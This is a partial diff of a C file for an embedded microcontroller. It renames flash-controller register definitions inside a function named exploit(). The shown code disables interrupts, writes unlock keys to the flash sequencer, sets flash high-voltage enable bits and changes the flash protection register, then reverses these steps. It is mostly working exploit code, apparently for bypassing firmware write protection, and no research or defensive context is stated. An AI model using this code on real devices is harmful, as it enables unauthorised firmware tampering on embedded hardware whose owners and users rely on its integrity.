@@ -3,11 +3,11 @@
 #include "dcra.h"
 
 #define FACI_PE_POLL_LIMIT 100000u
-#define FACI_FPCKAR MMIO16(0xFFA10084u)
-#define FACI_FENTRYR MMIO16(0xFFA10088u)
-#define FACI_FREQR MMIO16(0xFFA10020u)
-#define FLWL_REG MMIO32(0xFFF8A430u)
-#define FLWE_REG MMIO32(0xFFF82410u)
+#define FACI_FENTRYR   MMIO16(0xFFA10084u)
+#define FACI_FPROTR    MMIO16(0xFFA10088u)
+#define FACI_FAREASELC MMIO16(0xFFA10020u)
+#define FHVE15         MMIO32(0xFFF8A430u)
+#define FHVE3          MMIO32(0xFFF82410u)
 
 static const uint8_t original_instruction[4] = {0x1D, 0x30, 0xE0, 0xD1};
 
@@ -19,14 +19,14 @@ static int equal_bytes(const volatile uint8_t *left, const uint8_t *right, uint3
 }
 
 static void capture_snapshot(uint32_t values[8]) {
-  values[0] = MMIO8(0xFFA10000u);
-  values[1] = MMIO32(0xFFA10080u);
-  values[2] = MMIO8(0xFFA10010u);
-  values[3] = FACI_FPCKAR;
-  values[4] = FACI_FENTRYR;
-  values[5] = FACI_FREQR;
-  values[6] = FLWL_REG;
-  values[7] = FLWE_REG;
+  values[0] = MMIO8(0xFFA10000u);   /* FPMON */
+  values[1] = MMIO32(0xFFA10080u);  /* FSTATR */
+  values[2] = MMIO8(0xFFA10010u);   /* FASTAT */
+  values[3] = FACI_FENTRYR;
+  values[4] = FACI_FPROTR;
+  values[5] = FACI_FAREASELC;
+  values[6] = FHVE15;
+  values[7] = FHVE3;
 }
 
 static int snapshot_is_idle(const uint32_t values[8]) {
@@ -104,9 +104,9 @@ void exploit(void) {
   uint16_t primary_code = 0u;
   uint16_t cleanup_code = 0u;
   uint8_t unlock_attempted = 0u;
-  uint8_t flwl_attempted = 0u;
-  uint8_t flwe_attempted = 0u;
-  uint8_t fentry_attempted = 0u;
+  uint8_t fhve15_attempted = 0u;
+  uint8_t fhve3_attempted = 0u;
+  uint8_t fprotr_attempted = 0u;
 
   __asm__ volatile ("di");
   runtime_begin(&guard);
@@ -152,7 +152,7 @@ void exploit(void) {
 
   if (primary_code == 0u) {
     unlock_attempted = 1u;
-    FACI_FPCKAR = 0xAA01u;
+    FACI_FENTRYR = 0xAA01u;
     syncp();
     if (wait_register_masked(0xFFA10084u, 2u, 0xFFFFu, 0x0001u, &guard) != 0) {
       primary_code = 5u;
@@ -160,10 +160,10 @@ void exploit(void) {
     capture_snapshot(&snapshots[8]);
     if (primary_code != 0u) goto cleanup;
 
-    flwl_attempted = 1u;
-    FLWL_REG = 1u;
-    flwe_attempted = 1u;
-    FLWE_REG = 1u;
+    fhve15_attempted = 1u;
+    FHVE15 = 1u;
+    fhve3_attempted = 1u;
+    FHVE3 = 1u;
     syncp();
     if (wait_register_masked(0xFFF8A430u, 4u, 0xFFFFFFFFu, 1u, &guard) != 0) {
       primary_code = 6u;
@@ -175,9 +175,9 @@ void exploit(void) {
     capture_snapshot(&snapshots[16]);
     if (primary_code != 0u) goto cleanup;
 
-    FACI_FREQR = 0x3B00u;
-    fentry_attempted = 1u;
-    FACI_FENTRYR = 0x5501u;
+    FACI_FAREASELC = 0x3B00u;
+    fprotr_attempted = 1u;
+    FACI_FPROTR = 0x5501u;
     syncp();
     if (wait_register_masked(0xFFA10088u, 2u, 1u, 1u, &guard) != 0) {
       primary_code = 9u;
@@ -186,22 +186,22 @@ void exploit(void) {
   }
 
 cleanup:
-  if (flwl_attempted != 0u) FLWL_REG = 0u;
-  if (flwe_attempted != 0u) FLWE_REG = 0u;
-  if (flwe_attempted != 0u) (void)FLWE_REG;
+  if (fhve15_attempted != 0u) FHVE15 = 0u;
+  if (fhve3_attempted != 0u) FHVE3 = 0u;
+  if (fhve3_attempted != 0u) (void)FHVE3;
   syncp();
-  if (fentry_attempted != 0u) FACI_FENTRYR = 0x5500u;
-  if (unlock_attempted != 0u) FACI_FPCKAR = 0xAA00u;
+  if (fprotr_attempted != 0u) FACI_FPROTR = 0x5500u;
+  if (unlock_attempted != 0u) FACI_FENTRYR = 0xAA00u;
   syncp();
-  if (flwl_attempted != 0u
+  if (fhve15_attempted != 0u
       && wait_register_masked(0xFFF8A430u, 4u, 0xFFFFFFFFu, 0u, &guard) != 0) {
     cleanup_code |= 0x0001u;
   }
-  if (flwe_attempted != 0u
+  if (fhve3_attempted != 0u
       && wait_register_masked(0xFFF82410u, 4u, 0xFFFFFFFFu, 0u, &guard) != 0) {
     cleanup_code |= 0x0002u;
   }
-  if (fentry_attempted != 0u
+  if (fprotr_attempted != 0u
       && wait_register_masked(0xFFA10088u, 2u, 1u, 0u, &guard) != 0) {
     cleanup_code |= 0x0004u;
   }
